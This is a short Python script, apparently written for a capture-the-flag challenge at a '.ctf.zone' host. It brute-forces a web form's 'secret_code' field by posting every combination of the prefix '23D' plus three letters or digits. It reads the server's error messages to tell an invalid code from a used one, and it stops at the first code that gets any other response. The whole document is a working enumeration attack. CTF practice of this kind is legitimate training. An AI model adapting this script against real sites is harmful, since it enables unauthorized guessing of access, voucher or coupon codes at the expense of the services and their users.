import requests
import itertools
import string
from time import sleep
from tqdm import tqdm

url = "https://23drivers.ctf.zone/"
field_name = "secret_code"
prefix = "23D"
chars = string.ascii_uppercase + string.digits
suffix_len = 3

msg_used = "already used"       
msg_invalid = "unknown code!"

session = requests.Session()

def gen_codes():
    for tup in itertools.product(chars, repeat=suffix_len):
        yield prefix + ''.join(tup)

def try_code(code):
    data = {field_name: code}
    r = session.post(url, data=data, timeout=10)
    return r

def main():
    for i, code in tqdm(enumerate(gen_codes(), start=1)):
        r = try_code(code)
        text_lower = r.text.lower()

        if msg_used.lower() in text_lower:
            pass 
        elif msg_invalid.lower() in text_lower:
            pass 
        else:
            print(f"[VALID] {code}")
            print("Snippet:\n", r.text[:500])
            return 

        if i % 500 == 0:
            print(f"Probados {i} códigos...")

if __name__ == "__main__":
    main()